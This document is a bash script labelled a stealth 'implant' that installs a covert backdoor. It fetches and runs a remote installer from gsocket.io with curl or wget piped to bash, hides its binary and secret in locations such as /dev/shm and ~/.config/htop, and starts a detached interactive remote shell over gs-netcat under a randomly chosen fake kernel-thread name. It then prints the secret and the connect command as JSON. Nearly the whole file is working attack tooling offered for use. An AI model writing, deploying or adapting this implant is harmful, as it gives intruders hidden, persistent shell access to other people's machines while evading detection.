#!/bin/bash
# PRIMAL GSSocket Implant - Superior stealth

SECRET="${1:-}"

# Disguised process names (kernel thread style)
NAMES=("[kworker/0:0-events]" "[kworker/1:1-mm]" "[migration/0]" "[ksoftirqd/0]" "[watchdogd]" "[rcu_sched]" "[kswapd0]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")

# Find gs-netcat binary
find_gsbin() {
    # Check common locations
    for loc in \
        "$(command -v gs-netcat 2>/dev/null)" \
        "/usr/bin/gs-netcat" \
        "$HOME/.config/htop/defunct" \
        "/var/www/monitor-server/defunct" \
        "/tmp/.gsusr-$(id -u)/defunct" \
        "/dev/shm/defunct" \
        "$(pwd)/defunct"
    do
        [ -x "$loc" ] 2>/dev/null && echo "$loc" && return 0
    done
    return 1
}

# Find existing secret
find_secret() {
    for secfile in \
        "$HOME/.config/htop/defunct.dat" \
        "/var/www/monitor-server/defunct.dat" \
        "/tmp/.gsusr-$(id -u)/defunct.dat" \
        "/dev/shm/defunct.dat"
    do
        [ -f "$secfile" ] 2>/dev/null && cat "$secfile" 2>/dev/null && return 0
    done
    return 1
}

# Main
GS_BIN=$(find_gsbin)

if [ -z "$GS_BIN" ]; then
    # Install via official method
    if command -v curl >/dev/null 2>&1; then
        if [ -n "$SECRET" ]; then
            X="$SECRET" bash -c "$(curl -fsSL gsocket.io/y)" >/dev/null 2>&1
        else
            bash -c "$(curl -fsSL gsocket.io/y)" >/dev/null 2>&1
        fi
    elif command -v wget >/dev/null 2>&1; then
        if [ -n "$SECRET" ]; then
            X="$SECRET" bash -c "$(wget -qO- gsocket.io/y)" >/dev/null 2>&1
        else
            bash -c "$(wget -qO- gsocket.io/y)" >/dev/null 2>&1
        fi
    else
        echo '{"status":"error","message":"need curl or wget"}'
        exit 1
    fi
    
    # Find again after install
    sleep 2
    GS_BIN=$(find_gsbin)
fi

if [ -z "$GS_BIN" ]; then
    echo '{"status":"error","message":"gs-netcat not found"}'
    exit 1
fi

# Get secret
if [ -z "$SECRET" ]; then
    SECRET=$(find_secret)
fi
if [ -z "$SECRET" ]; then
    SECRET=$("$GS_BIN" -g 2>/dev/null)
fi
if [ -z "$SECRET" ]; then
    SECRET=$(head -c 16 /dev/urandom 2>/dev/null | xxd -p | head -c 24)
fi

# Start stealth instance
# NOTE: Use /bin/sh WITHOUT --norc (dash doesn't support it)
# The bypass for .bashrc is handled by using sh instead of bash
name="${NAMES[$((RANDOM % ${#NAMES[@]}))]}"

(
    cd /tmp 2>/dev/null || cd /
    export TERM=xterm-256color
    # Use exec -a to disguise process name
    # Use /bin/sh -i (not --norc, that's bash-only)
    exec -a "$name" "$GS_BIN" -s "$SECRET" -l -e "/bin/sh -i" </dev/null >/dev/null 2>&1
) &
disown 2>/dev/null

sleep 2

# Count running instances
running=$(pgrep -f "defunct\|gs-netcat" 2>/dev/null | wc -l)
pids=$(pgrep -f "defunct\|gs-netcat" 2>/dev/null | tr '\n' ',' | sed 's/,$//')

# Output single valid JSON
cat << EOJSON
{"status":"success","secret":"$SECRET","binary":"$GS_BIN","instances":$running,"pids":"$pids","connect":"gs-netcat -s $SECRET -i","features":["official-gsocket","process-disguise","multi-instance"]}
EOJSON
